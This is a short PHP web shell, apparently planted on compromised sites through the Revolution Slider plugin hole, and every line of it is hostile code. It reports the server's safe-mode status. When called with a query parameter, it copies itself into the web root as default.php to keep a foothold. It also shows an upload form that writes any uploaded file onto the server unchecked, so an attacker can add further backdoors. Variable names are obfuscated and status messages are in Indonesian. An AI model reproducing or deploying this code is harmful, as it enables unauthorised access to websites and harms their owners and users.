<?php
echo '[syslog]01
'; echo '<title>RevSlideR 2015</title><br><br>'; $sp6236ec = strtolower(substr(PHP_OS, 0, 3)) == 'win'; if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $sp7efe52 = true; $sp1093eb = '4,1ON(BuSuX)'; echo '[syslog]02
'; } else { $sp7efe52 = false; $sp1093eb = 'OFF(WoKeH)'; } $sp6050b9 = true; $sp7476f6 = 'Safe-mode:[Safe-mode:' . $sp1093eb . '] 7 [OS:' . $sp6050b9 . ']'; echo '<center> ' . $sp7476f6 . ' </center><br>'; echo '[syslog]03
'; if (isset($_GET['x'])) { echo '<title>PiNDaH 2015</title><br><br>'; $sp60cf97 = $_SERVER['SCRIPT_FILENAME']; $sp612eaf = $_SERVER['DOCUMENT_ROOT'] . '/default.php'; copy($sp60cf97, $sp612eaf); } echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if ($_POST['_upl'] == 'Upload') { if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; } else { echo '<b>Upload GAGAL !!!</b><br><br>'; } echo '[syslog]04
'; } echo '[syslog]05
';